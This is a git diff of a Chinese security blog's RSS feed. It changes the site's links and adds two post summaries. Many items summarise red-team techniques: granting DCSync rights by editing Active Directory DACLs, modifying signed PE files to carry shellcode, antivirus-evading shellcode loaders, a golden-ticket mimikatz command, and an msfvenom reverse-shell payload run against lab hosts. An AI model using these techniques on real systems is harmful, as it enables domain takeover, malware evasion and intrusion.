@@ -2,17 +2,64 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on 2867a0</title>
-    <link>https://gokarna-hugo.netlify.app/posts/</link>
+    <link>https://2867a0.github.io/posts/</link>
     <description>Recent content in Posts on 2867a0</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sun, 16 Jul 2023 07:16:00 +0800</lastBuildDate><atom:link href="https://gokarna-hugo.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 22 Jul 2023 23:09:00 +0800</lastBuildDate><atom:link href="https://2867a0.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>GoLdapTool工具开发篇-2: SDDL修改</title>
+      <link>https://2867a0.github.io/posts/2023/sddl_2/</link>
+      <pubDate>Sat, 22 Jul 2023 23:09:00 +0800</pubDate>
+      
+      <guid>https://2867a0.github.io/posts/2023/sddl_2/</guid>
+      <description>SDDL修改 能解析就能修改，线索
+在官方issues中提到Dacl修改的步骤。在impacket中有没有相关库呢，example文件夹中ldap-shell下的do_write_gpo_dacl有相关实现，代码如下，查询了Dacl后创建新的ace条目，将其添加到Dacl的数据末尾，之后执行修改操作。既然python可以，那么golang也可以。
+​
+修改 在golang中，我们也可以按照python的逻辑：
+查询Dacl 创建Ace条目，将Ace添加到Dacl中 更新数据偏移 修改 相关代码我已经实现了。首先是查询域控的SDDL属性，按照上一节所述的格式解析之后，创建一个新的Ace条目，逻辑如下图函数所示。首先创建一个Ace结构体，（这里是硬编码）填充相关结构，设置Ace的扩展为ObjectType，SID和ObjectType是可以指定的。
+209行aceEntry.Update()是将数据转换为字节结构保存，是为了后续转换为原始数据准备。
+215行将ace条目写入到Dacl中的Ace数组中。之后要记得更新Dacl中的AceCount、AclSize。dacl.update()也是更新了Dacl的原始数据。
+​
+Dacl的数据更新完毕后还要更新SrSecurityDescriptor中的OffsetOwner和OffsetGroup，更新大小为我们添加的Ace的大小偏移+原来的偏移大小
+​
+最后，将修改完毕的数据转换为字节，并调用ldap的修改方法进行修改。
+​
+效果 先查询域控中哪些用户具有DCSync权限，如下图，存在用户john。
+​
+之后，我们再添加一个用户jim，脚本提示添加完成。
+​
+再次查询，jim用户具有DCSync权限
+​</description>
+    </item>
+    
+    <item>
+      <title>不破坏签名并修改签名文件</title>
+      <link>https://2867a0.github.io/posts/2023/modify_signature_hash/</link>
+      <pubDate>Sat, 22 Jul 2023 23:09:00 +0800</pubDate>
+      
+      <guid>https://2867a0.github.io/posts/2023/modify_signature_hash/</guid>
+      <description>PE文件中，生成签名的时候会有一部分不参与签名hash计算，我们可以修改这部分而不破坏签名校验
+下图中粗体的部分，就是签名的相关内容。灰色背景的部分，不参与签名的hash计算。
+证书表偏移位于数据目录中第5个结构，VirtualAddress是文件偏移，Size是证书表的大小
+按照偏移找到证书表开头，证书表前几个字节是一个WIN_CERTIFICATE结构体，其中前4个字节为证书的大小。每一个证书信息都需要按照8字节进行对齐
+下图中，最后两个字节是填充字节00，手动修改这一部分进行验证。
+签名正常
+追加字节，需要修改DataDirArray[4].Size、证书大小
+26744-&amp;gt;26752
+0x6878 -&amp;gt; 0x6880
+修改完成，签名正常
+代码实现 C++版本的SigFlip可以自动添加shellcode到签名文件中。
+也有golang版本的，在此基础上进行了修改，只有修改签名驱动的hash功能
+修改的工具会在驱动的末尾添加 kfcvme50 的字符串</description>
+    </item>
+    
     <item>
       <title>GoLdapTool工具开发篇-1: SDDL解析</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/sddl_1/</link>
+      <link>https://2867a0.github.io/posts/2023/sddl_1/</link>
       <pubDate>Sun, 16 Jul 2023 07:16:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/sddl_1/</guid>
+      <guid>https://2867a0.github.io/posts/2023/sddl_1/</guid>
       <description>python编写的ldap查询工具不能编译，不方便在windows主机上使用，于是想着用golang去重构。golang有ldap v3库，可以满足基本的查询需求。但是，该库没有实现SDDL的解析。在其issues中有提到相关的解析文章，可以自己实现。
 解析 要解析SDDL数据，需要先获取一段原始数据，做如下查询并将nTSecurityDescriptor​的原始数据打印出来，如下图。
 ​
@@ -22,7 +69,7 @@
 NtSecurityDescriptor header 根据微软官方​[MS-DTYP]: 2.4.6的描述，该部分是一个SECURITY_DESCRIPTOR​结构，有如下字段。其中，Revision​、Sbz1​、Control​、OffsetOwner​、OffsetGroup​、OffsetSacl​、OffsetDacl​这几个字段总共占20个字节。
 OffsetOwner​和OffsetGroup​是所有者、所在组的数据偏移，OffsetSacl​和OffsetDacl​是Sacl header、Dacl header数据的偏移地址。根据这些偏移找到对应的数据并将数据解析赋值给变量OwnerSid​、GroupSid​、Sacl​、Dacl​
 ​​
-上述结构对应我们Dump出来的数据如下图。我们主要关心的是其偏移大小**。**​OffsetOwner​占4个字节，为C0 08 00 00​，按照小端解析为00 00 08 C0​，转换为10进制值为2240​。OffsetGroup​同理。
+上述结构对应我们Dump出来的数据如下图。我们主要关心的是其偏移大小。​OffsetOwner​占4个字节，为C0 08 00 00​，按照小端解析为00 00 08 C0​，转换为10进制值为2240​。OffsetGroup​同理。
 OffsetSacl​的数据为14 00 00 00​，转换为10进制后是20​，也就是说，NtSecurityDescriptor header​之后紧跟着Sacl header​（偏移的起始地址为NtSecurityDescriptor header​的第一个字节）。
 OffsetDacl​的数据为8C 00 00 00​，按照小端排序为00 00 00 8C​，转换为10进制之后是0x8C=140​
 ​​
@@ -32,7 +79,7 @@ Sacl 解析 Sacl​这一部分的数据包含Sacl header​ 和多个 Sacl Ace�
 ​​
 我们找到原始数据中对应的字节数，如下图，就是Sacl header​
 ​​
-这是解析之后的**。**​Acl Size​字段数据为78 00​，转换后的10进制值为120​。这个大小是Sacl header​的大小 + 所有Sacl Ace​的大小
+这是解析之后的。​Acl Size​字段数据为78 00​，转换后的10进制值为120​。这个大小是Sacl header​的大小 + 所有Sacl Ace​的大小
 Ace Count​的值为2，也就是说Sacl有两条Ace
 ​​
 Sacl header​之后紧跟着的是其对应的Ace数据。
@@ -41,10 +88,10 @@ Sacl header​之后紧跟着的是其对应的Ace数据。
     
     <item>
       <title>利用ADS删除自身</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/adsdeleteself/</link>
+      <link>https://2867a0.github.io/posts/2023/adsdeleteself/</link>
       <pubDate>Sun, 11 Jun 2023 08:18:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/adsdeleteself/</guid>
+      <guid>https://2867a0.github.io/posts/2023/adsdeleteself/</guid>
       <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。
 在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录
 所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：
@@ -67,10 +114,10 @@ notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以�
     
     <item>
       <title>Write Memory Trick</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/writememorytrick/</link>
+      <link>https://2867a0.github.io/posts/2023/writememorytrick/</link>
       <pubDate>Wed, 22 Mar 2023 07:12:30 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/writememorytrick/</guid>
+      <guid>https://2867a0.github.io/posts/2023/writememorytrick/</guid>
       <description>[TOC]
 vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。
 PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。
@@ -80,10 +127,10 @@ PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字�
     
     <item>
       <title>Pe To Shellcode</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/petoshellcode/</link>
+      <link>https://2867a0.github.io/posts/2023/petoshellcode/</link>
       <pubDate>Fri, 03 Mar 2023 08:00:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/petoshellcode/</guid>
+      <guid>https://2867a0.github.io/posts/2023/petoshellcode/</guid>
       <description>原项目地址
 pe2shc 先把它转成vs项目，程序入口接受两个参数，待转换文件和转换后文件输出路径
 首先执行的是is_supported_pe()函数。读取源文件，按照内存对齐方式将数据读取到内存，判断是否为可以转换的程序
@@ -103,10 +150,10 @@ NT头+176指向的是BaseRelocationTable的首地址，确保重定位表存在�
     
     <item>
       <title>Big Stack bypass</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/bigstack/</link>
+      <link>https://2867a0.github.io/posts/2023/bigstack/</link>
       <pubDate>Mon, 13 Feb 2023 08:00:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/bigstack/</guid>
+      <guid>https://2867a0.github.io/posts/2023/bigstack/</guid>
       <description>[TOC]
 2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。
 测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。
@@ -117,10 +164,10 @@ visual studio编译需要设置字符集为多字节、堆栈提交大小为2000
     
     <item>
       <title>Rpc Create Service</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/rpc-create-service/</link>
+      <link>https://2867a0.github.io/posts/2022/rpc-create-service/</link>
       <pubDate>Wed, 23 Nov 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/rpc-create-service/</guid>
+      <guid>https://2867a0.github.io/posts/2022/rpc-create-service/</guid>
       <description>调用CreateService()创建服务会被360拦截。用Rpc接口创建服务就能绕过。
 SCMR pipe protocol uuid IDL file \\pipe\svcctl MS-SCMR {367ABB81-9844-35F1-AD32-98F038001003} 微软官方文档 SCMR（Service Control Manager Remote Protocol）是基于RPC的协议，用于配置和控制远程计算机上运行的服务程序。该协议维护一个内部数据库来存储服务程序配置和状态。服务控制管理器协议对该内部数据库具有独占访问权。
 在一个操作系统实例上只有一个 SCM 和一个对应的 SCM 数据库。对此内部数据库的任何更新都只能通过服务控制管理器远程协议进行。SCM 负责序列化对 SCM 数据库的所有并发访问。SCM数据库常驻内存；每次 SCM 重新启动时（每次重新启动后）都会重新创建它。SCM 数据库的一部分是从持久存储（有关注册服务的所有信息）和部分非持久存储（服务的当前活动状态）中检索的。
@@ -135,10 +182,10 @@ Demo代码 基于上述假设编写测试代码。将微软提供的IDL代码保
     
     <item>
       <title>回调函数加载器</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/callback-function/</link>
+      <link>https://2867a0.github.io/posts/2022/callback-function/</link>
       <pubDate>Sun, 13 Nov 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/callback-function/</guid>
+      <guid>https://2867a0.github.io/posts/2022/callback-function/</guid>
       <description>是github项目AlternativeShellcodeExec中提到的一些函数可以用来执行shellcode
 项目里面还有很多函数可以利用，因为是在本地线程执行shellcode的，所以这里只贴出其中一个完整的利用代码
 #include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;wincrypt.h&amp;gt; #include &amp;lt;WinInet.h&amp;gt; #pragma comment(lib, &amp;#34;WinInet.lib&amp;#34;) // Requires Crypt32.lib // 需要在链接器 -&amp;gt; 输入 -&amp;gt; 附加依赖项 中添加如下库 /* kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Crypt32.lib */ // 定义结构体 typedef struct { char* shellcode; int size; } SHELLCODO, * PSHELLCODE; BOOL downloadShellcode(LPCWSTR url, int port, LPCWSTR payloadPath, BOOL isEncrypted, PSHELLCODE pShellcode); int main() { SHELLCODO shellcode = { 0 }; BOOL s = downloadShellcode(L&amp;#34;192.</description>
@@ -146,10 +193,10 @@ Demo代码 基于上述假设编写测试代码。将微软提供的IDL代码保
     
     <item>
       <title>Rpc introduction</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/rpc-intro/</link>
+      <link>https://2867a0.github.io/posts/2022/rpc-intro/</link>
       <pubDate>Sat, 10 Sep 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/rpc-intro/</guid>
+      <guid>https://2867a0.github.io/posts/2022/rpc-intro/</guid>
       <description>2. rpc介绍(是什么、有什么用、谁在用) 2.1 RPC介绍 RPC协议主要用来进行远程过程调用，用一句话来概括，就是允许用户程序调用服务器上的函数进行计算，由此实现两者交互。
 早先的企业环境中，所有的服务都在一台主机上，就会导致服务器负荷过重，无法保证业务的正常运作。正因如此，后来企业就更换了一种思路，将不同服务分开，分别存放在不同主机上，暂时解决了负荷问题。但是久而久之，这样的方式也开始显现弊端，比如当用户需要使用不同服务器上的服务协作来完成任务时，服务与服务之间该如何交互？
 这就是RPC要解决的问题，简言之，RPC可以允许一台机器上的程序调用另一台机器上的函数，通过各计算机协作进行计算，以保证用户任务顺利完成，RPC的通信过程如下图所示（摘自微软官方）
@@ -165,10 +212,10 @@ RpcView手动分析每一个接口 Ghidra + Jupyter 图形化分析（该方法�
     
     <item>
       <title>Kerberos: 利用</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/</link>
+      <link>https://2867a0.github.io/posts/2022/kerberos-attack/</link>
       <pubDate>Sat, 05 Mar 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/</guid>
+      <guid>https://2867a0.github.io/posts/2022/kerberos-attack/</guid>
       <description>TGT阶段 黄金票据 利用的是第二次：身份认证请求包，身份认证返回包中的ticket使用krbtgt的 NTLM hash加密，如果能获得krbtgt hash，就能自己制作TGT票据。即黄金票据
 kerberos::golden /domain:[domain] /sid:[domain sid] /id:500 /user:AnyFuckUser /krbtgt:[krbtgt NTLM Hash] 用户名枚举 在请求TGT票据协商请求包中，因为服务器没有去验证请求用户的密码，所以可以修改CNameString去猜解域用户名
 nmap的krb5-enum-users脚本使用该方式来枚举用户名。
@@ -191,10 +238,10 @@ TGS阶段 Kerberoasting 在请求TGS票据的时候，只要请求的TGT票据�
     
     <item>
       <title>Kerberos: AP-REQ</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-ap-req/</link>
+      <link>https://2867a0.github.io/posts/2022/kerberos-ap-req/</link>
       <pubDate>Sun, 20 Feb 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-ap-req/</guid>
+      <guid>https://2867a0.github.io/posts/2022/kerberos-ap-req/</guid>
       <description>请求TGS票据我准备用kekeo。在普通域机器上执行下面的命令发起TGS请求。
 # 先请求一张jm的TGT票据 kekeo.exe &amp;#34;tgt::ask /domain:yunwei.lab /user:jm /password:123.com&amp;#34; # 再请求TGS票据 kekeo.exe &amp;#34;tgs::ask /tgt:TGT_.kirbi /service:cifs/srv2012.yunwei.lab&amp;#34; &amp;#34;exit&amp;#34; 请求 常规的请求TGS票据里面会携带padata和req-body数据块。
 padata中的ap-req.ticket是请求的TGT票据。KDC会校验TGT票据，如果票据正确，就返回TGS票据。
@@ -206,10 +253,10 @@ req-body块中，cname.CNameString表示发起请求的用户是jm；sname.SName
     
     <item>
       <title>Kerberos: AS-REQ</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-as-req/</link>
+      <link>https://2867a0.github.io/posts/2022/kerberos-as-req/</link>
       <pubDate>Thu, 10 Feb 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-as-req/</guid>
+      <guid>https://2867a0.github.io/posts/2022/kerberos-as-req/</guid>
       <description> 分析kerberos请求第一阶段，以下是基于impacket请求发出的数据包进行分析。其他工具可能有所差异，但问题不大。
 impacket-getTGT yunwei.lab/jm:123.com -dc-ip 20.0.0.100 在impacket中，一共会发送两次AS Req包。
 第一次：协商 第一次为协商请求包，这个数据包的功能有两个：
@@ -223,10 +270,10 @@ TGT票据使用krbtgt账户的密码hash进行加密，TGT票据中包含PAC。P
     
     <item>
       <title>Kerberos: 认证过程</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-base/</link>
+      <link>https://2867a0.github.io/posts/2022/kerberos-base/</link>
       <pubDate>Tue, 01 Feb 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-base/</guid>
+      <guid>https://2867a0.github.io/posts/2022/kerberos-base/</guid>
       <description>基本认证过程 请求TGT票据 客户端请求：发送客户端hash加密的时间戳
 服务器响应：解密，如果时间戳在一定范围内，认证通过，返回TGT票据和session key。TGT票据使用krbtgt hash加密，TGT票据中包含PAC。PAC又包含 Client SID + Client Group。session key会作为下阶段认证密钥
 请求TGS票据 客户端请求：拿着TGT票据向KDC发起针对特定服务的TGS请求
@@ -239,10 +286,10 @@ AP请求/响应 客户端请求：拿着TGS票据请求特定服务
     
     <item>
       <title>绕过火绒上线MSF</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/</link>
+      <link>https://2867a0.github.io/posts/2021/hipsdaemon-bypass/</link>
       <pubDate>Sat, 13 Nov 2021 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/</guid>
+      <guid>https://2867a0.github.io/posts/2021/hipsdaemon-bypass/</guid>
       <description>[TOC]
 环境 攻击机 靶机 kali + msf + hta脚本 Windows Server 2008 + mshta IP: 10.0.0.4 IP: 10.0.0.100 复现 kali 下载原始hta脚本（1.hta），msf生成原始32位windows shellcode，并将shellcode进行base64编码。将编码后的shellcode替换原始hta脚本（2.hta）
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=10.0.0.4 lport=443 -f raw &amp;gt; shellcode.bin cat shellcode.bin | base64 -w 0 kali开启http服务准备投递hta脚本
@@ -253,10 +300,10 @@ sudo msfconsole use exploit/multi/handler set payload windows/meterpreter/revers
     
     <item>
       <title>Hello</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2021/first-post/</link>
+      <link>https://2867a0.github.io/posts/2021/first-post/</link>
       <pubDate>Fri, 01 Jan 2021 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2021/first-post/</guid>
+      <guid>https://2867a0.github.io/posts/2021/first-post/</guid>
       <description>[TOC]
 hello
 anything
